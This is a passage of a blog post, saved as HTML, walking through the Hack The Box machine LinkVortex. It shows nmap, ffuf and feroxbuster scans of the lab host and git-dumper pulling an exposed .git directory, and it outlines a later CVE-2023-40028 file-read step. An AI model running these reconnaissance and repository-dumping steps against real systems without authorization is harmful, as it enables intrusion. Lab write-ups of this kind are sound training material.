@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/04/11/hackthebox-linkvortex/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewLinkVortex is an easy-difficulty machine from Hack The Box dealing initially with subdomain enumeration to reveal a hidden subdomain from which we will dump an exmposed .git directoy leading u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: LinkVortex">
+<meta property="og:url" content="http://fouedsaidi.com/2025/04/11/Hackthebox-LinkVortex/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewLinkVortex is an easy-difficulty machine from Hack The Box dealing initially with subdomain enumeration to reveal a hidden subdomain from which we will dump an exmposed .git directoy leading u">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/LinkVortex/LinkVortex.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/LinkVortex/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/LinkVortex/web1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/LinkVortex/web2.png">
+<meta property="article:published_time" content="2025-04-11T09:41:04.000Z">
+<meta property="article:modified_time" content="2025-04-11T11:25:40.872Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/LinkVortex/LinkVortex.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: LinkVortex -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: LinkVortex</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-04-11 10:41:04</span>
+        <span class="mobile">2025-04-11 10:41:04</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-04-11 12:25:40</span>
+            <span class="mobile">2025-04-11 12:25:40</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>LinkVortex is an easy-difficulty machine from Hack The Box dealing initially with subdomain enumeration to reveal a hidden subdomain from which we will dump an exmposed .git directoy leading us to exfiltrate credentials, to later abusing CVE-2023-40028 which is a symlink file upload -&gt; arbitrary file read which allows us to get new credentials to finally abuse a custom script that symlinks png files by chaining a couple of symlinks to be able to read the root flag.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/LinkVortex/LinkVortex.png"
+                      alt="LinkVortex-info-card"
+                ><figcaption>LinkVortex-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">227.69</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span><span class="literal">-04-11</span> <span class="number">11</span>:<span class="number">02</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">227.69</span></span><br><span class="line">Host is up (<span class="number">0.11</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>e:f8:b9:<span class="number">68</span>:c8:eb:<span class="number">57</span>:<span class="number">0</span>f:cb:<span class="number">0</span>b:<span class="number">47</span>:b9:<span class="number">86</span>:<span class="number">50</span>:<span class="number">83</span>:eb (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> a2:ea:<span class="number">6</span>e:e1:b6:d7:e7:c5:<span class="number">86</span>:<span class="number">69</span>:ce:ba:<span class="number">05</span>:<span class="number">9</span>e:<span class="number">38</span>:<span class="number">13</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://linkvortex.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">39.35</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our typical ssh 22 port alongside a web application on port 80 that’s redirecting us to <code>http://linkvortex.htb/</code>. So let’s go ahead and add that to our <code>/etc/hosts</code> file.</p>
+<h4 id="Subdomain-Enumeration-with-Ffuf"><a href="#Subdomain-Enumeration-with-Ffuf" class="headerlink" title="Subdomain Enumeration with Ffuf"></a>Subdomain Enumeration with Ffuf</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\Tools\ffuf_2.<span class="number">0.0</span>_windows_amd64&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>\Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.linkvortex.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.227.69&quot;</span>  <span class="literal">-fs</span> <span class="number">230</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.227.69</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Desktop\Tools\SecLists-master\SecLists-master\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.linkvortex.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 230</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 133ms]:00:00] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: dev</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we also have a <code>dev</code> subdomain that we can add to our <code>/etc/hosts</code></p>
+<h3 id="Web-Application-http-linkvortex-htb"><a href="#Web-Application-http-linkvortex-htb" class="headerlink" title="Web Application - http://linkvortex.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://linkvortex.htb/" >http://linkvortex.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/LinkVortex/web.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Seems like a casual web app with no apparent features. It’s also powered by <a class="link"   target="_blank" rel="noopener" href="https://ghost.org/" >https://ghost.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> CMS.</p>
+<h3 id="Web-Application-http-dev-linkvortex-htb"><a href="#Web-Application-http-dev-linkvortex-htb" class="headerlink" title="Web Application - http://dev.linkvortex.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://dev.linkvortex.htb/" >http://dev.linkvortex.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/LinkVortex/web1.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>The site is still under construction, however when we do directory bruteforcing on it we discover some juicy stuff:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\Tools&gt; feroxbuster.exe <span class="literal">-u</span> http://dev.linkvortex.htb <span class="literal">-w</span> .\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>\Discovery\Web<span class="literal">-Content</span>\big.txt</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: <span class="number">2.8</span>.<span class="number">0</span></span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://dev.linkvortex.htb</span><br><span class="line"> 🚀  Threads               │ <span class="number">50</span></span><br><span class="line"> 📖  Wordlist              │ .\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>\Discovery\Web<span class="literal">-Content</span>\big.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ <span class="number">7</span></span><br><span class="line"> 🦡  User<span class="literal">-Agent</span>            │ feroxbuster/<span class="number">2.8</span>.<span class="number">0</span></span><br><span class="line"> 🏁  HTTP methods          │ [<span class="type">GET</span>]</span><br><span class="line"> 🔃  Recursion Depth       │ <span class="number">4</span></span><br><span class="line"> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [<span class="type">ENTER</span>] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">WLD        -         -         -         - http://dev.linkvortex.htb =&gt; auto<span class="literal">-filtering</span> <span class="number">404</span><span class="operator">-like</span> response (<span class="number">7</span> lines); toggle this behavior by <span class="keyword">using</span> --dont-filter</span><br><span class="line"><span class="number">200</span>      GET      <span class="number">115</span>l      <span class="number">255</span>w     <span class="number">2538</span>c http://dev.linkvortex.htb/</span><br><span class="line">&lt;snip&gt;</span><br><span class="line">🚨 Caught ctrl+c 🚨 saving scan state to ferox<span class="literal">-http_dev_linkvortex_htb-1744368731</span>.state ...</span><br><span class="line">[<span class="comment">##&gt;-----------------] - 26s     6753/61431   3m      found:1       errors:0</span></span><br><span class="line">[<span class="comment">#####&gt;--------------] - 26s     5687/20477   218/s   http://dev<span class="doctag">.link</span>vortex.htb/</span></span><br><span class="line">[<span class="comment">####################] - 0s     20477/20477   0/s     http://dev<span class="doctag">.link</span>vortex.htb/.git/ =&gt; Directory listing (add -e to scan)</span></span><br><span class="line">[<span class="comment">#&gt;------------------] - 9s      1063/20477   116/s   http://dev<span class="doctag">.link</span>vortex.htb/cgi-bin/</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can directly see that there is a <code>.git</code> directory exposed. Let’s get that using <code>git-dumper</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ git-dumper http://dev.linkvortex.htb/ git_dir</span><br><span class="line">[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]</span><br><span class="line">[-] Testing http://dev.linkvortex.htb/.git/ [200]</span><br><span class="line">[-] Fetching .git recursively</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.gitignore [404]</span><br><span class="line">[-] http://dev.linkvortex.htb/.gitignore responded with status code 404</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/config [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/description [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/index [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]</span><br><span class="line">[-] Fetching 